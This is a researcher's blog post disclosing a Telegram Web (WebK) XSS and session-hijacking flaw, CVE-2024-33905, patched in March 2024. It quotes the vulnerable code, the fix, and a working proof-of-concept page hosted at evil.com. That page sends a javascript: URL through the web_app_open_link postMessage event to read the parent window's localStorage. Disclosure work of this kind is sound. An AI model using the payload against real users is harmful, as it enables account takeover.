[Open in app](https://rsci.app.link/?%24canonical_url=https%3A%2F%2Fmedium.com%2Fp%2F95acccdc8d90&%7Efeature=LoOpenInAppButton&%7Echannel=ShowPostUnderUser&source=---top_nav_layout_nav----------------------------------)

Sign up

[Sign in](/m/signin?operation=login&redirect=https%3A%2F%2Fmedium.com%2F%40pedbap%2Ftelegram-web-app-xss-session-hijacking-1-click-95acccdc8d90&source=post_page---top_nav_layout_nav-----------------------global_nav-----------)

[Write](/m/signin?operation=register&redirect=https%3A%2F%2Fmedium.com%2Fnew-story&source=---top_nav_layout_nav-----------------------new_post_topnav-----------)

Sign up

[Sign in](/m/signin?operation=login&redirect=https%3A%2F%2Fmedium.com%2F%40pedbap%2Ftelegram-web-app-xss-session-hijacking-1-click-95acccdc8d90&source=post_page---top_nav_layout_nav-----------------------global_nav-----------)

![](https://miro.medium.com/v2/resize:fill:64:64/1*dmbNkD5D-u45r44go_cf0g.png)
# Telegram Web app XSS/Session Hijacking 1-click [CVE-2024–33905]

[![pedbap](https://miro.medium.com/v2/da:true/resize:fill:88:88/0*6LdK3bPFTIeNJQTN)](/%40pedbap?source=post_page---byline--95acccdc8d90--------------------------------)

[pedbap](/%40pedbap?source=post_page---byline--95acccdc8d90--------------------------------)

·

[Follow](/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fsubscribe%2Fuser%2F8389e117d119&operation=register&redirect=https%3A%2F%2Fmedium.com%2F%40pedbap%2Ftelegram-web-app-xss-session-hijacking-1-click-95acccdc8d90&user=pedbap&userId=8389e117d119&source=post_page-8389e117d119--byline--95acccdc8d90---------------------post_header-----------)

2 min read·Apr 28, 2024

--

Listen

Share

This is the technical write up of a severe vulnerability I reported to Telegram’s Bug Bounty program on *March 9th, 2024.*Telegram fixed the flaw on *March 11th, 2024*.

Vulnerable version: Telegram WebK 2.0.0 (486) and below
Fixed version: Telegram WebK 2.0.0 (488)

**CVE-2024–33905**<https://nvd.nist.gov/vuln/detail/CVE-2024-33905>

# Attack surface

# Telegram Mini Apps

**“**Telegram Mini Apps are essentially web applications that you can run directly within the Telegram messenger interface. Mini Apps support seamless authorization, integrated crypto and fiat payments (via Google Pay and Apple Pay), tailored push notifications, and more.**”**

This attack surface also affects *web3* users because it handles crypto payments through the **TON Blockchain**.

> <https://ton.org/mini-apps>
>
> <https://core.telegram.org/bots/webapps>

# Vulnerability description

A malicious Mini Web App can execute arbitrary JavaScript execution in the parent context **web.telegram.org** leading to Session Hijacking.
The XSS vulnerability is triggered using the event type **web\_app\_open\_link** via **postMessage**.

## files

> This is the cached version of the vulnerable file: https://web.telegram.org/k/appDialogsManager-aLs9GOvc.js
>
> <https://web.telegram.org/src/components/popups/webApp.ts> (404 due patch)

The vulnerability occurs in the following line:

```
telegramWebView.addMultipleEventsListeners({
  // [...]
  web_app_open_link:({url:t})=>{window.open(t,"_blank")}
}
```

The event **web\_app\_open\_link** opens a new tab with the specified **url** passed as argument. For such cases, an attacker can use the the **javascript:** scheme to remain with the JavaScript context from the parent window regardless of opening a new tab with another URL. That said, the payload **javascript:alert(1)** would trigger the XSS PoC (execution on web.telegram.com by visiting my Mini App)

**The Setup**
**1.** Attacker creates a Bot + Mini App
**2.** Sets the URL of the Mini App => https://evil.com/homepage.html
**3.** The exploit will be hosted in the homepage of the attacker’s site
**3.1.** homepage.html

```
<body onload=exploit()>
<script>
function exploit() {
    window.parent.postMessage(JSON.stringify({eventType: 'web_app_open_link', eventData: {url: "javascript:alert(JSON.stringify(window.parent.localStorage))"}}), '*');
}
</script>
</body>
```
# Exploit Demo

# Telegram Patch release

<https://github.com/morethanwords/tweb/commit/2153ea9878668769faac8dd5931b7e0b96a9f129/src/components/popups/webApp.ts>

```
      web_app_open_link: ({url}) => {
-        window.open(url, '_blank');
+      safeWindowOpen(url);
      },
```

**safeWindowOpen**

```
export default function safeWindowOpen(url: string) {
  window.open(url, '_blank', 'noreferrer');
}
```

The ‘**noreferrer**’ argument does a couple things to fix this flaw:

* Prevents the newly opened window from sending the *Referer* header back to the original page.
* The new window is isolated from the parent window’s context, including its JavaScript execution environment.

And this is the commit to prod (.env):

<https://github.com/morethanwords/tweb/commit/b41c5d93ad2f86690dd8dcbd4ca0f66a2273ba06>

```
VITE_API_ID=1025907
VITE_API_HASH=452b0359b988148995f22ff0f4229750
VITE_VERSION=2.0.0
- VITE_VERSION_FULL=2.0.0 (487)
- VITE_BUILD=487
+ VITE_VERSION_FULL=2.0.0 (488)
+ VITE_BUILD=488
VITE_MTPROTO_WORKER=1
VITE_MTPROTO_SW=
VITE_MTPROTO_HTTP=
```
[Offensive Security](/tag/offensive-security?source=post_page-----95acccdc8d90--------------------------------)[Modern Web Application](/tag/modern-web-application?source=post_page-----95acccdc8d90--------------------------------)[Vulnerability Research](/tag/vulnerability-research?source=post_page-----95acccdc8d90--------------------------------)[Exploit](/tag/exploit?source=post_page-----95acccdc8d90--------------------------------)

--

--

[![pedbap](https://miro.medium.com/v2/resize:fill:96:96/0*6LdK3bPFTIeNJQTN)](/%40pedbap?source=post_page---post_author_info--95acccdc8d90--------------------------------)[![pedbap](https://miro.medium.com/v2/resize:fill:128:128/0*6LdK3bPFTIeNJQTN)](/%40pedbap?source=post_page---post_author_info--95acccdc8d90--------------------------------)Follow[## Written by pedbap](/%40pedbap?source=post_page---post_author_info--95acccdc8d90--------------------------------)[24 Followers](/%40pedbap/followers?source=post_page---post_author_info--95acccdc8d90--------------------------------)·[2 Following](/%40pedbap/following?source=post_page---post_author_info--95acccdc8d90--------------------------------)

Offensive security research, #1 in my country!

Follow
## No responses yet

[Help](https://help.medium.com/hc/en-us?source=post_page-----95acccdc8d90--------------------------------)[Status](https://medium.statuspage.io/?source=post_page-----95acccdc8d90--------------------------------)[About](/about?autoplay=1&source=post_page-----95acccdc8d90--------------------------------)[Careers](/jobs-at-medium/work-at-medium-959d1a85284e?source=post_page-----95acccdc8d90--------------------------------)[Press](pressinquiries%40medium.com?source=post_page-----95acccdc8d90--------------------------------)[Blog](https://blog.medium.com/?source=post_page-----95acccdc8d90--------------------------------)[Privacy](https://policy.medium.com/medium-privacy-policy-f03bf92035c9?source=post_page-----95acccdc8d90--------------------------------)[Terms](https://policy.medium.com/medium-terms-of-service-9db0094a1e0f?source=post_page-----95acccdc8d90--------------------------------)[Text to speech](https://speechify.com/medium?source=post_page-----95acccdc8d90--------------------------------)[Teams](/business?source=post_page-----95acccdc8d90--------------------------------)

